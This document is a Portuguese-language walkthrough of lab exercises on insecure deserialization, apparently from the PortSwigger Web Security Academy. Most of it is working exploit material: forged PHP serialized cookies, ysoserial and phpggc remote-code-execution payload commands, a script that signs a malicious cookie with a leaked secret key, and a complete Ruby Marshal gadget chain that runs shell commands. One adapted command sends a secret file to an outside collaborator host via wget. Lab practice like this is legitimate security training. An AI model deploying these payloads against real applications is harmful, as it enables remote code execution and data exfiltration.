# Deserialização Insegura

A extensão Java Deserialization Sacanner pode ser bem útil para identificar e montar payloads quando a vulnerabilidade é em Java.

Para Java também pode gerar o exploit com o [ysoserial](https://github.com/frohoff/ysoserial) e para PHP com o [phpggc](https://github.com/ambionics/phpggc).

<br>

## Laboratórios

**Using Application Functionality to Exploit Insecure Deserialization**

Delete o usuário adicional para estudar as requisições.

Na request `POST /my-account/delete`, altere o cookie serializado para:
```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"upjgj8nlrqjsi09uqh41pflrceoig0lx";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

<br>
<br>

**Arbitrary Object Injection in PHP**

Encontre o arquivo `/libs/CustomTemplate.php~` e perceba o método `destruct()`.

Envie o seguinte cookie:
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

<br>
<br>

**Exploiting Java Deserialization with Apache Commons**

Utilize o scan do Burp para identificar que o objeto serializado é um Java Commons.

Use o ysoserial para gerar o payload:
```
java \
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
 --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\
 -jar ./ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

> [!NOTE]  
> Às vezes o número da CommonsCollections não funciona na aplicação alvo e você precisa testar outras versçoes. Também lembre de encodar o cookie em URL.

<br>
<br>

**Exploiting PHP Deserialization with a Pre-Built Gadget Chain**

1. Enumere o arquivo `phpinfo.php` que pode ser encontrado no código-fonte.
2. Encontre a versão do framework Symfony ao enviar um cookie inválido.
3. Salve a chave secreta encontrada no arquivo `/cgi-bin/phpinfo.php`.
4. Crie o payload com o phpgcc:
```
docker run phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```
5. Agora precisamos construir um cookie válido contendo o payload malicooso e assiná-lo com a chave obtida.
```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "n7w5ixp4wm3euh1iic9phxh1c1d1womh";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

<br>

Versão adaptada:
```
docker run phpggc Symfony/RCE4 exec 'wget http://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0
```

<br>
<br>

Exploiting Ruby Deserialization Using a Documented Gadget Chain

Use o scan do burp para identificar que o objeto serializado é Ruby utilizando Marshal.

Copie o payload [desse artigo](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) e substitua as duas últimas linhas para que o código gere o payload necessário.
```
require 'base64'

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

<br>

Você pode usar esse comando para remover espaços em brancos do payload:
```
echo -n PAYLOAD | tr -d "\r\n"
```
